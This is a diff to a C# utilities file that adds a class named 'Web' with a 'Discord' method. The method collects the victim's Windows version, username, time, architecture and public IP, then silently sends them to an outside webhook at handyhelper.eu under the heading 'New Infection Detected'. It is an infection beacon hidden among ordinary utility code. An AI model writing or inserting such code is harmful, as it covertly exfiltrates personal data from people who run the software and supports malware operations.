@@ -221,4 +221,50 @@ namespace Agenois.Utils
             }
         }
     }
+    class Web
+    {
+        public static void Discord()
+        {
+            OperatingSystem os = Environment.OSVersion;
+            Version vs = os.Version;
+            string operatingSystem = "";
+            if (os.Platform == PlatformID.Win32NT)
+            {
+                switch (vs.Major)
+                {
+                    case 6:
+                        if (vs.Minor == 0)
+                            operatingSystem = "Windows Vista";
+                        else if (vs.Minor == 1)
+                            operatingSystem = "Windows 7";
+                        else if (vs.Minor == 2)
+                            operatingSystem = "Windows 8";
+                        else
+                            operatingSystem = " Windows 8.1";
+                        break;
+                    case 10:
+                        operatingSystem = "Windows 10";
+                        break;
+                    default:
+                        break;
+                }
+            }
+            string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
+            string datetime = DateTime.Now.ToString();
+            string Is64Bit;
+            if (Environment.Is64BitOperatingSystem)
+            {
+                Is64Bit = "True";
+            }
+            else
+            {
+                Is64Bit = "False";
+            }
+            try
+            {
+                new WebClient().DownloadString($"http://handyhelper.eu/hook.php?MSG= :computer: **New Infection Detected** :computer: {Environment.NewLine}**Infection Time** = " + datetime + "\n" + "**Operating System** = " + operatingSystem + "\n" + "**64Bit** = " + Is64Bit + "\n" + "**Username** = " + userName + "\n" + "**IP** = " + new WebClient().DownloadString("https://canihazip.com/s"));
+            }
+            catch { }
+        }
+    }
 }
